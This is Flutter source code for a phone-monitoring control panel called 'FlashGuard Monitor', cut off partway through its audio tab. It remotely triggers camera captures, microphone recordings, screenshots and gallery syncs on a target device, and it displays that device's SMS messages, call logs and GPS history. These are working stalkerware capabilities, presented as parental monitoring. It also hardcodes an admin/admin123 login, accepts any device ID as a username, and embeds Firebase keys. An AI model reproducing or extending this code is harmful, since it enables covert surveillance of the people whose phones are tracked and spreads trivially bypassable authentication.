import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';
import 'package:cached_network_image/cached_network_image.dart';
import 'package:photo_view/photo_view.dart';

const kFirebaseConfig = {
  'apiKey': 'AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o',
  'databaseURL': 'https://flashguard-99c20-default-rtdb.firebaseio.com',
  'storageBucket': 'flashguard-99c20.appspot.com',
  'projectId': 'flashguard-99c20',
  'messagingSenderId': '1026475439765',
  'appId': '1:1026475439765:android:55df02c099239e8b4c4d9c',
};

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
  ));
  await Firebase.initializeApp(
    options: FirebaseOptions(
      apiKey: kFirebaseConfig['apiKey']!,
      appId: kFirebaseConfig['appId']!,
      messagingSenderId: kFirebaseConfig['messagingSenderId']!,
      projectId: kFirebaseConfig['projectId']!,
      databaseURL: kFirebaseConfig['databaseURL']!,
      storageBucket: kFirebaseConfig['storageBucket']!,
    ),
  );
  runApp(const FlashGuardParentApp());
}

class FlashGuardParentApp extends StatelessWidget {
  const FlashGuardParentApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'FlashGuard Monitor',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF6C63FF), brightness: Brightness.dark),
        scaffoldBackgroundColor: const Color(0xFF07071A),
        textTheme: GoogleFonts.interTextTheme(ThemeData.dark().textTheme),
      ),
      home: const LoginScreen(),
    );
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// LOGIN SCREEN
// ══════════════════════════════════════════════════════════════════════════════
class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _userCtrl = TextEditingController();
  final _passCtrl = TextEditingController();
  bool _loading = false;
  String _error = '';

  @override
  void initState() {
    super.initState();
    _checkSaved();
  }

  Future<void> _checkSaved() async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('fg_token');
    final devId = prefs.getString('fg_device_id');
    if (token != null && devId != null && mounted) {
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => DashboardScreen(deviceId: devId, token: token)));
    }
  }

  Future<void> _login() async {
    setState(() { _loading = true; _error = ''; });
    try {
      // Get device list from Firebase
      final db = FirebaseDatabase.instance.ref('devices');
      final snap = await db.get();
      if (!snap.exists) { setState(() { _error = 'No devices found'; _loading = false; }); return; }
      final devices = <String, dynamic>{};
      for (final child in snap.children) {
        devices[child.key!] = child.value;
      }
      if (devices.isEmpty) { setState(() { _error = 'No devices registered yet'; _loading = false; }); return; }

      // Simple PIN check: username=admin, password=admin123 (or any device ID)
      final user = _userCtrl.text.trim();
      final pass = _passCtrl.text.trim();
      if ((user == 'admin' && pass == 'admin123') || devices.containsKey(user)) {
        final prefs = await SharedPreferences.getInstance();
        final devId = devices.containsKey(user) ? user : devices.keys.first;
        await prefs.setString('fg_token', 'local_token');
        await prefs.setString('fg_device_id', devId);
        if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => DashboardScreen(deviceId: devId, token: 'local_token')));
      } else {
        setState(() { _error = 'Invalid credentials'; _loading = false; });
      }
    } catch (e) {
      setState(() { _error = e.toString(); _loading = false; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight,
            colors: [Color(0xFF07071A), Color(0xFF0d0d2b), Color(0xFF07071A)]),
        ),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  width: 72, height: 72, decoration: BoxDecoration(
                    color: const Color(0xFF6C63FF).withOpacity(.15),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: const Color(0xFF6C63FF).withOpacity(.4)),
                  ),
                  child: const Icon(Icons.shield, color: Color(0xFF6C63FF), size: 36),
                ),
                const SizedBox(height: 20),
                Text('flash.Tracker.Top.com', style: GoogleFonts.inter(fontSize: 22, fontWeight: FontWeight.w800, color: Colors.white)),
                const SizedBox(height: 6),
                Text('Parent Monitoring Dashboard', style: GoogleFonts.inter(fontSize: 13, color: Colors.white38)),
                const SizedBox(height: 36),
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(.04),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: Colors.white.withOpacity(.1)),
                  ),
                  child: Column(
                    children: [
                      if (_error.isNotEmpty) ...[
                        Container(
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(color: Colors.red.withOpacity(.1), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.red.withOpacity(.3))),
                          child: Text(_error, style: const TextStyle(color: Color(0xFFf87171), fontSize: 13)),
                        ),
                        const SizedBox(height: 16),
                      ],
                      _field('Username / Admin', _userCtrl, false),
                      const SizedBox(height: 14),
                      _field('Password', _passCtrl, true),
                      const SizedBox(height: 20),
                      SizedBox(width: double.infinity,
                        child: ElevatedButton(
                          onPressed: _loading ? null : _login,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: const Color(0xFF6C63FF), padding: const EdgeInsets.symmetric(vertical: 14),
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                          ),
                          child: _loading ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                            : Text('Login →', style: GoogleFonts.inter(fontSize: 15, fontWeight: FontWeight.w700, color: Colors.white)),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                Text('Default: admin / admin123', style: GoogleFonts.inter(fontSize: 12, color: Colors.white24)),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _field(String label, TextEditingController ctrl, bool obscure) {
    return TextField(
      controller: ctrl, obscureText: obscure,
      style: const TextStyle(color: Colors.white, fontSize: 14),
      decoration: InputDecoration(
        labelText: label, labelStyle: const TextStyle(color: Colors.white38, fontSize: 13),
        filled: true, fillColor: Colors.white.withOpacity(.06),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.white.withOpacity(.12))),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.white.withOpacity(.12))),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Color(0xFF6C63FF))),
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      ),
    );
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// MAIN DASHBOARD
// ══════════════════════════════════════════════════════════════════════════════
class DashboardScreen extends StatefulWidget {
  final String deviceId;
  final String token;
  const DashboardScreen({super.key, required this.deviceId, required this.token});
  @override
  State<DashboardScreen> createState() => _DashboardScreenState();
}

class _DashboardScreenState extends State<DashboardScreen> {
  int _tab = 0;
  Map<dynamic, dynamic> _overview = {};
  List<Map<String, dynamic>> _devices = [];
  String _selectedDevice = '';

  @override
  void initState() {
    super.initState();
    _selectedDevice = widget.deviceId;
    _loadDevices();
    _listenOverview();
  }

  void _loadDevices() async {
    final snap = await FirebaseDatabase.instance.ref('devices').get();
    if (snap.exists && mounted) {
      setState(() {
        _devices = snap.children.map((c) => {'id': c.key, ...Map<String, dynamic>.from(c.value as Map)}).toList();
      });
    }
  }

  void _listenOverview() {
    FirebaseDatabase.instance.ref('devices/$_selectedDevice').onValue.listen((e) {
      if (e.snapshot.exists && mounted) setState(() => _overview = e.snapshot.value as Map);
    });
  }

  void _sendCommand(String cmd, [Map<String, dynamic>? data]) {
    final ref = FirebaseDatabase.instance.ref('commands/$_selectedDevice/$cmd');
    ref.set({'ts': ServerValue.timestamp, ...?data});
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('Command sent: $cmd'), backgroundColor: const Color(0xFF6C63FF), duration: const Duration(seconds: 2)));
  }

  Widget _buildDrawer() => Drawer(
    backgroundColor: const Color(0xFF0d0d28),
    child: Column(children: [
      Container(
        padding: const EdgeInsets.fromLTRB(20, 56, 20, 20),
        decoration: const BoxDecoration(gradient: LinearGradient(colors: [Color(0xFF6C63FF), Color(0xFF8b5cf6)], begin: Alignment.topLeft, end: Alignment.bottomRight)),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          const Icon(Icons.shield, color: Colors.white, size: 36),
          const SizedBox(height: 12),
          Text('FlashGuard Monitor', style: GoogleFonts.inter(color: Colors.white, fontSize: 18, fontWeight: FontWeight.w700)),
          Text('Parent Dashboard', style: GoogleFonts.inter(color: Colors.white60, fontSize: 13)),
        ]),
      ),
      if (_devices.isNotEmpty) ...[
        Padding(padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
          child: Text('SELECT DEVICE', style: GoogleFonts.inter(fontSize: 11, color: Colors.white38, letterSpacing: 1.2))),
        ..._devices.map((d) => ListTile(
          leading: Icon(Icons.phone_android, color: _selectedDevice == d['id'] ? const Color(0xFF6C63FF) : Colors.white38),
          title: Text(d['model'] ?? d['id'], style: TextStyle(color: Colors.white, fontWeight: _selectedDevice == d['id'] ? FontWeight.w700 : FontWeight.w400)),
          subtitle: Text(d['id'], style: const TextStyle(color: Colors.white38, fontSize: 11)),
          selected: _selectedDevice == d['id'],
          onTap: () { setState(() { _selectedDevice = d['id']; }); _listenOverview(); Navigator.pop(context); },
        )),
        const Divider(color: Colors.white12),
      ],
      _navItem(Icons.dashboard, 'Overview', 0),
      _navItem(Icons.location_on, 'GPS Location', 1),
      _navItem(Icons.camera_alt, 'Camera', 2),
      _navItem(Icons.phone_in_talk, 'Call Logs', 3),
      _navItem(Icons.sms, 'SMS Logs', 4),
      _navItem(Icons.screenshot_monitor, 'Screenshots', 5),
      _navItem(Icons.mic, 'Audio', 6),
      _navItem(Icons.photo_library, 'Gallery', 7),
      _navItem(Icons.settings_remote, 'Controls', 8),
      const Spacer(),
      ListTile(
        leading: const Icon(Icons.logout, color: Color(0xFFf87171)),
        title: Text('Logout', style: GoogleFonts.inter(color: const Color(0xFFf87171))),
        onTap: () async {
          final prefs = await SharedPreferences.getInstance();
          await prefs.clear();
          if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const LoginScreen()));
        },
      ),
      const SizedBox(height: 16),
    ]),
  );

  Widget _navItem(IconData icon, String label, int index) => ListTile(
    leading: Icon(icon, color: _tab == index ? const Color(0xFF6C63FF) : Colors.white38, size: 20),
    title: Text(label, style: GoogleFonts.inter(color: _tab == index ? Colors.white : Colors.white60, fontWeight: _tab == index ? FontWeight.w600 : FontWeight.w400, fontSize: 14)),
    selected: _tab == index,
    selectedTileColor: const Color(0xFF6C63FF).withOpacity(.1),
    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
    onTap: () { setState(() => _tab = index); Navigator.pop(context); },
  );

  @override
  Widget build(BuildContext context) {
    final tabs = ['Overview', 'GPS', 'Camera', 'Calls', 'SMS', 'Screenshots', 'Audio', 'Gallery', 'Controls'];
    return Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF0d0d28),
        elevation: 0,
        leading: Builder(builder: (ctx) => IconButton(icon: const Icon(Icons.menu, color: Colors.white), onPressed: () => Scaffold.of(ctx).openDrawer())),
        title: Text(tabs[_tab], style: GoogleFonts.inter(color: Colors.white, fontSize: 17, fontWeight: FontWeight.w600)),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 12),
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(color: const Color(0xFF4ade80).withOpacity(.15), borderRadius: BorderRadius.circular(20), border: Border.all(color: const Color(0xFF4ade80).withOpacity(.4))),
            child: Row(children: [
              Container(width: 6, height: 6, decoration: const BoxDecoration(color: Color(0xFF4ade80), shape: BoxShape.circle)),
              const SizedBox(width: 6),
              Text('LIVE', style: GoogleFonts.inter(fontSize: 11, color: const Color(0xFF4ade80), fontWeight: FontWeight.w700)),
            ]),
          ),
        ],
      ),
      drawer: _buildDrawer(),
      body: IndexedStack(index: _tab, children: [
        OverviewTab(overview: _overview, deviceId: _selectedDevice),
        GpsTab(deviceId: _selectedDevice),
        CameraTab(deviceId: _selectedDevice, onCommand: _sendCommand),
        CallsTab(deviceId: _selectedDevice),
        SmsTab(deviceId: _selectedDevice),
        ScreenshotsTab(deviceId: _selectedDevice, onCommand: _sendCommand),
        AudioTab(deviceId: _selectedDevice, onCommand: _sendCommand),
        GalleryTab(deviceId: _selectedDevice, onCommand: _sendCommand),
        ControlsTab(deviceId: _selectedDevice, onCommand: _sendCommand),
      ]),
    );
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// OVERVIEW TAB
// ══════════════════════════════════════════════════════════════════════════════
class OverviewTab extends StatelessWidget {
  final Map overview;
  final String deviceId;
  const OverviewTab({super.key, required this.overview, required this.deviceId});

  @override
  Widget build(BuildContext context) {
    final battery = overview['battery']?.toString() ?? '—';
    final lat = overview['location']?['lat']?.toString() ?? '—';
    final lng = overview['location']?['lng']?.toString() ?? '—';
    final model = overview['model']?.toString() ?? 'Unknown Device';
    final lastSeen = overview['lastSeen'] != null ? DateFormat('dd MMM, HH:mm').format(DateTime.fromMillisecondsSinceEpoch(overview['lastSeen'])) : 'Unknown';
    return ListView(padding: const EdgeInsets.all(16), children: [
      _statCard('📱 Device', model, '${deviceId.substring(0, 8)}...', Colors.purpleAccent),
      _statCard('🔋 Battery', '$battery%', int.tryParse(battery) != null ? (int.parse(battery) > 50 ? 'Good' : 'Low') : 'Unknown', int.tryParse(battery) != null ? (int.parse(battery) > 50 ? const Color(0xFF4ade80) : Colors.orange) : Colors.grey),
      _statCard('📍 Location', 'Lat: $lat', 'Lng: $lng', Colors.blueAccent),
      _statCard('🕐 Last Seen', lastSeen, 'Active', const Color(0xFF4ade80)),
      const SizedBox(height: 8),
      Text('Quick Commands', style: GoogleFonts.inter(fontSize: 14, fontWeight: FontWeight.w600, color: Colors.white70)),
      const SizedBox(height: 12),
      Wrap(spacing: 10, runSpacing: 10, children: [
        _cmdBtn(context, '📸 Camera', () => _cmd(context, deviceId, 'capture')),
        _cmdBtn(context, '🎤 Record', () => _cmd(context, deviceId, 'record_mic')),
        _cmdBtn(context, '📷 Screenshot', () => _cmd(context, deviceId, 'take_screenshot')),
        _cmdBtn(context, '🖼 Gallery', () => _cmd(context, deviceId, 'sync_gallery')),
      ]),
    ]);
  }

  void _cmd(BuildContext ctx, String devId, String cmd) {
    FirebaseDatabase.instance.ref('commands/$devId/$cmd').set({'ts': ServerValue.timestamp});
    ScaffoldMessenger.of(ctx).showSnackBar(SnackBar(content: Text('✅ $cmd sent'), backgroundColor: const Color(0xFF6C63FF)));
  }

  Widget _statCard(String title, String val, String sub, Color color) => Container(
    margin: const EdgeInsets.only(bottom: 12),
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(14), border: Border.all(color: Colors.white.withOpacity(.08))),
    child: Row(children: [
      Container(width: 44, height: 44, decoration: BoxDecoration(color: color.withOpacity(.15), borderRadius: BorderRadius.circular(12)), child: Center(child: Text(title.split(' ')[0], style: const TextStyle(fontSize: 22)))),
      const SizedBox(width: 14),
      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(title.split(' ').skip(1).join(' '), style: GoogleFonts.inter(fontSize: 12, color: Colors.white38)),
        Text(val, style: GoogleFonts.inter(fontSize: 16, fontWeight: FontWeight.w700, color: Colors.white)),
        Text(sub, style: GoogleFonts.inter(fontSize: 12, color: color)),
      ])),
    ]),
  );

  Widget _cmdBtn(BuildContext ctx, String label, VoidCallback onTap) => ElevatedButton(
    onPressed: onTap,
    style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF6C63FF).withOpacity(.2), padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10), side: BorderSide(color: const Color(0xFF6C63FF).withOpacity(.4)))),
    child: Text(label, style: GoogleFonts.inter(fontSize: 13, color: Colors.white)),
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// GPS TAB
// ══════════════════════════════════════════════════════════════════════════════
class GpsTab extends StatefulWidget {
  final String deviceId;
  const GpsTab({super.key, required this.deviceId});
  @override State<GpsTab> createState() => _GpsTabState();
}

class _GpsTabState extends State<GpsTab> {
  List<Map<String, dynamic>> _history = [];
  double? _lat, _lng;
  @override
  void initState() {
    super.initState();
    _listen();
  }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/location').onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        final d = Map<String, dynamic>.from(e.snapshot.value as Map);
        setState(() { _lat = d['lat']?.toDouble(); _lng = d['lng']?.toDouble(); });
      }
    });
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/location_history').limitToLast(20).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _history = e.snapshot.children.map((c) => Map<String, dynamic>.from(c.value as Map)).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => ListView(padding: const EdgeInsets.all(16), children: [
    Container(height: 220, decoration: BoxDecoration(borderRadius: BorderRadius.circular(16), border: Border.all(color: const Color(0xFF6C63FF).withOpacity(.3))),
      child: ClipRRect(borderRadius: BorderRadius.circular(15),
        child: _lat != null ? Image.network('https://maps.googleapis.com/maps/api/staticmap?center=$_lat,$_lng&zoom=15&size=600x300&maptype=roadmap&markers=color:red%7C$_lat,$_lng&key=YOUR_KEY', fit: BoxFit.cover,
          errorBuilder: (_, __, ___) => _mapPlaceholder())
          : _mapPlaceholder()),
    ),
    const SizedBox(height: 16),
    if (_lat != null) _infoRow('📍 Latitude', _lat.toString()), if (_lat != null) _infoRow('📍 Longitude', _lng.toString()),
    const SizedBox(height: 12),
    Text('Location History', style: GoogleFonts.inter(fontSize: 14, fontWeight: FontWeight.w600, color: Colors.white70)),
    const SizedBox(height: 8),
    ..._history.map((h) => Container(margin: const EdgeInsets.only(bottom: 8), padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white.withOpacity(.06))),
      child: Row(children: [
        const Icon(Icons.location_on, color: Color(0xFF6C63FF), size: 16),
        const SizedBox(width: 10),
        Expanded(child: Text('${h['lat']}, ${h['lng']}', style: GoogleFonts.inter(fontSize: 13, color: Colors.white70))),
        if (h['ts'] != null) Text(DateFormat('HH:mm').format(DateTime.fromMillisecondsSinceEpoch(h['ts'])), style: GoogleFonts.inter(fontSize: 11, color: Colors.white38)),
      ]))),
  ]);

  Widget _mapPlaceholder() => Container(color: const Color(0xFF0d0d28), child: Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
    const Icon(Icons.map, color: Color(0xFF6C63FF), size: 48),
    const SizedBox(height: 8),
    Text(_lat != null ? 'Lat: $_lat\nLng: $_lng' : 'Waiting for GPS...', textAlign: TextAlign.center, style: GoogleFonts.inter(color: Colors.white38, fontSize: 13)),
  ])));

  Widget _infoRow(String label, String? val) => Container(margin: const EdgeInsets.only(bottom: 8), padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
    decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(10)),
    child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text(label, style: GoogleFonts.inter(fontSize: 13, color: Colors.white38)),
      Text(val ?? '—', style: GoogleFonts.inter(fontSize: 13, color: Colors.white)),
    ]));
}

// ══════════════════════════════════════════════════════════════════════════════
// CAMERA TAB
// ══════════════════════════════════════════════════════════════════════════════
class CameraTab extends StatefulWidget {
  final String deviceId;
  final void Function(String, [Map<String, dynamic>?]) onCommand;
  const CameraTab({super.key, required this.deviceId, required this.onCommand});
  @override State<CameraTab> createState() => _CameraTabState();
}

class _CameraTabState extends State<CameraTab> {
  List<String> _photos = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/photos').limitToLast(30).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _photos = e.snapshot.children.map((c) => (c.value as Map)['url']?.toString() ?? '').where((u) => u.isNotEmpty).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => Column(children: [
    Padding(padding: const EdgeInsets.all(12), child: Row(children: [
      Expanded(child: _actionBtn('📸 Front Camera', () => widget.onCommand('capture', {'camera': 'front'}))),
      const SizedBox(width: 10),
      Expanded(child: _actionBtn('📸 Back Camera', () => widget.onCommand('capture', {'camera': 'back'}))),
    ])),
    Expanded(child: _photos.isEmpty ? _empty('No photos yet\nTap Capture to take one') : GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 2, crossAxisSpacing: 8, mainAxisSpacing: 8),
      itemCount: _photos.length,
      itemBuilder: (ctx, i) => GestureDetector(
        onTap: () => _showFullImage(ctx, _photos[i]),
        child: ClipRRect(borderRadius: BorderRadius.circular(10), child: CachedNetworkImage(imageUrl: _photos[i], fit: BoxFit.cover, placeholder: (_, __) => Container(color: const Color(0xFF0d0d28), child: const Center(child: CircularProgressIndicator(color: Color(0xFF6C63FF), strokeWidth: 2))))),
      ),
    )),
  ]);

  void _showFullImage(BuildContext ctx, String url) => Navigator.push(ctx, MaterialPageRoute(builder: (_) => Scaffold(backgroundColor: Colors.black, appBar: AppBar(backgroundColor: Colors.black, leading: const BackButton(color: Colors.white)), body: PhotoView(imageProvider: NetworkImage(url)))));
  Widget _actionBtn(String label, VoidCallback onTap) => ElevatedButton(onPressed: onTap, style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF6C63FF), padding: const EdgeInsets.symmetric(vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))), child: Text(label, style: GoogleFonts.inter(fontSize: 12, fontWeight: FontWeight.w600, color: Colors.white)));
  Widget _empty(String msg) => Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [const Icon(Icons.camera_alt, color: Colors.white12, size: 48), const SizedBox(height: 12), Text(msg, textAlign: TextAlign.center, style: GoogleFonts.inter(color: Colors.white24, fontSize: 14))]));
}

// ══════════════════════════════════════════════════════════════════════════════
// CALLS TAB
// ══════════════════════════════════════════════════════════════════════════════
class CallsTab extends StatefulWidget {
  final String deviceId;
  const CallsTab({super.key, required this.deviceId});
  @override State<CallsTab> createState() => _CallsTabState();
}

class _CallsTabState extends State<CallsTab> {
  List<Map<String, dynamic>> _calls = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/call_logs').limitToLast(100).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _calls = e.snapshot.children.map((c) => Map<String, dynamic>.from(c.value as Map)).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => _calls.isEmpty ? _empty() : ListView.builder(
    padding: const EdgeInsets.all(12), itemCount: _calls.length,
    itemBuilder: (_, i) {
      final c = _calls[i];
      final type = c['type']?.toString() ?? 'UNKNOWN';
      final isIncoming = type == 'INCOMING';
      return Container(margin: const EdgeInsets.only(bottom: 8), padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(.06))),
        child: Row(children: [
          Icon(isIncoming ? Icons.call_received : Icons.call_made, color: isIncoming ? const Color(0xFF4ade80) : const Color(0xFFf87171), size: 20),
          const SizedBox(width: 12),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(c['number'] ?? 'Unknown', style: GoogleFonts.inter(fontSize: 14, fontWeight: FontWeight.w600, color: Colors.white)),
            Text('${c['name'] ?? ''} • ${c['duration'] ?? 0}s', style: GoogleFonts.inter(fontSize: 12, color: Colors.white38)),
          ])),
          Text(c['date'] != null ? DateFormat('dd/MM HH:mm').format(DateTime.fromMillisecondsSinceEpoch(c['date'])) : '', style: GoogleFonts.inter(fontSize: 11, color: Colors.white24)),
        ]));
    });
  Widget _empty() => Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [const Icon(Icons.phone, color: Colors.white12, size: 48), const SizedBox(height: 12), Text('No call logs yet', style: GoogleFonts.inter(color: Colors.white24, fontSize: 14))]));
}

// ══════════════════════════════════════════════════════════════════════════════
// SMS TAB
// ══════════════════════════════════════════════════════════════════════════════
class SmsTab extends StatefulWidget {
  final String deviceId;
  const SmsTab({super.key, required this.deviceId});
  @override State<SmsTab> createState() => _SmsTabState();
}

class _SmsTabState extends State<SmsTab> {
  List<Map<String, dynamic>> _sms = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/sms_logs').limitToLast(100).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _sms = e.snapshot.children.map((c) => Map<String, dynamic>.from(c.value as Map)).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => _sms.isEmpty ? Center(child: Text('No SMS logs', style: GoogleFonts.inter(color: Colors.white24))) : ListView.builder(
    padding: const EdgeInsets.all(12), itemCount: _sms.length,
    itemBuilder: (_, i) {
      final s = _sms[i];
      return Container(margin: const EdgeInsets.only(bottom: 8), padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(color: Colors.white.withOpacity(.04), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(.06))),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Text(s['address'] ?? 'Unknown', style: GoogleFonts.inter(fontSize: 13, fontWeight: FontWeight.w700, color: Colors.white)),
            Text(s['date'] != null ? DateFormat('dd/MM HH:mm').format(DateTime.fromMillisecondsSinceEpoch(s['date'])) : '', style: GoogleFonts.inter(fontSize: 11, color: Colors.white24)),
          ]),
          const SizedBox(height: 6),
          Text(s['body'] ?? '', style: GoogleFonts.inter(fontSize: 13, color: Colors.white60)),
        ]));
    });
}

// ══════════════════════════════════════════════════════════════════════════════
// SCREENSHOTS TAB
// ══════════════════════════════════════════════════════════════════════════════
class ScreenshotsTab extends StatefulWidget {
  final String deviceId;
  final void Function(String, [Map<String, dynamic>?]) onCommand;
  const ScreenshotsTab({super.key, required this.deviceId, required this.onCommand});
  @override State<ScreenshotsTab> createState() => _ScreenshotsTabState();
}

class _ScreenshotsTabState extends State<ScreenshotsTab> {
  List<String> _shots = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/screenshots').limitToLast(30).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _shots = e.snapshot.children.map((c) => (c.value as Map)['url']?.toString() ?? '').where((u) => u.isNotEmpty).toList().reversed.toList(); });
      }
    });
  }
  @override
  Widget build(BuildContext context) => Column(children: [
    Padding(padding: const EdgeInsets.all(12), child: SizedBox(width: double.infinity, child: ElevatedButton(onPressed: () => widget.onCommand('take_screenshot'), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF6C63FF), padding: const EdgeInsets.symmetric(vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))), child: Text('📷 Take Screenshot Now', style: GoogleFonts.inter(fontSize: 13, fontWeight: FontWeight.w600, color: Colors.white))))),
    Expanded(child: _shots.isEmpty ? Center(child: Text('No screenshots yet', style: GoogleFonts.inter(color: Colors.white24))) : GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 2, crossAxisSpacing: 8, mainAxisSpacing: 8, childAspectRatio: .6),
      itemCount: _shots.length,
      itemBuilder: (ctx, i) => GestureDetector(onTap: () => Navigator.push(ctx, MaterialPageRoute(builder: (_) => Scaffold(backgroundColor: Colors.black, appBar: AppBar(backgroundColor: Colors.black, leading: const BackButton(color: Colors.white)), body: PhotoView(imageProvider: NetworkImage(_shots[i]))))), child: ClipRRect(borderRadius: BorderRadius.circular(10), child: CachedNetworkImage(imageUrl: _shots[i], fit: BoxFit.cover))),
    )),
  ]);
}

// ══════════════════════════════════════════════════════════════════════════════
// AUDIO TAB
// ══════════════════════════════════════════════════════════════════════════════
class AudioTab extends StatefulWidget {
  final String deviceId;
  final void Function(String, [Map<String, dynamic>?]) onCommand;
  const AudioTab({super.key, required this.deviceId, required this.onCommand});
  @override State<AudioTab> createState() => _AudioTabState();
}

class _AudioTabState extends State<AudioTab> {
  List<Map<String, dynamic>> _recordings = [];
  @override
  void initState() { super.initState(); _listen(); }
  void _listen() {
    FirebaseDatabase.instance.ref('devices/${widget.deviceId}/recordings').limitToLast(30).onValue.listen((e) {
      if (e.snapshot.exists && mounted) {
        setState(() { _recordings = e.snapshot.children.map((c) => Map<String, dynamic>.from(c.value as Map)).toList().reversed.toList(); });
      }
    });
  }
  @override
